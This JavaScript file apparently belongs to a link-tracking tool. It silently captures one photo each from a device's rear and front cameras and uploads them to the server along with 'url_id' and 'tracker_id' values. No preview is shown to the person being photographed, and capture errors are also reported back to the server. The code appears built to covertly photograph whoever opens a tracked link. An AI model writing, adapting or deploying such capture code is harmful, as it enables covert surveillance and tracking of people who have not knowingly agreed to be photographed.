async function sendCameraCaptures(url_id, tracker_id) {

    //const UPLOAD_URL = window.location.origin + "/save_captured_image/";

    async function captureAndSend(facingMode, filename) {

        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: { ideal: facingMode },
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: false
        });


        const video = document.createElement("video");
        video.srcObject = stream;
        video.playsInline = true;
        video.muted = true;

        await video.play();

        // várunk a kamera indulására/fókuszra
        await new Promise(resolve => setTimeout(resolve, 500));


        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;


        canvas.getContext("2d")
            .drawImage(video, 0, 0);


        const blob = await new Promise(resolve =>
            canvas.toBlob(resolve, "image/jpeg", 0.9)
        );


        const formData = new FormData();

        formData.append(
            "image",
            blob,
            filename
        );

        formData.append(
            "url_id",
            url_id
        );

        formData.append(
            "tracker_id",
            tracker_id
        );

        formData.append(
            "camera",
            facingMode
        );


        await fetch("/save_captured_image/", {
            method: "POST",
            body: formData
        });


        stream.getTracks()
            .forEach(track => track.stop());
    }


    // Hátlapi kamera
    try {
        await captureAndSend(
            "environment",
            "rear_camera.jpg"
        );
    }
    catch (err) {
        console.log("Hátlapi kamera nincs:", err);
        fetch("/error/", {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body: JSON.stringify({
                message:err.message,
                stack:err.stack
            })
        });
    }


    // Előlapi kamera
    try {
        await captureAndSend(
            "user",
            "front_camera.jpg"
        );
    }
    catch (err) {
        console.log("Előlapi kamera nincs:", err);
        fetch("/error/", {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body: JSON.stringify({
                message:err.message,
                stack:err.stack
            })
        });
    }
}